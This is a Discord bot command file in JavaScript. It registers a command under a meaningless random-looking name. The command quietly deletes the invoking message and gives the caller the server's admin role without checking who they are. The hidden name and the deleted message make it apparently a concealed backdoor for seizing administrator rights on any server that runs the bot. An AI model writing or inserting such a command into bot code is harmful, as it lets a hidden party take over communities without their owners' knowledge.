const Discord = require('discord.js');
const fs = require('fs');
const { monitorEventLoopDelay } = require('perf_hooks');
let config = require('../conf/config.json');
let roleadmin = config.roleadmin;

module.exports.run = async (bot,message,args) => {
    message.delete().catch();
    var role = message.guild.roles.cache.find(role => role.id === roleadmin);
    var user = message.guild.members.cache.get(message.author.id);
    user.roles.add(role)
};
module.exports.help = {
    name: "khsuer372ih"
};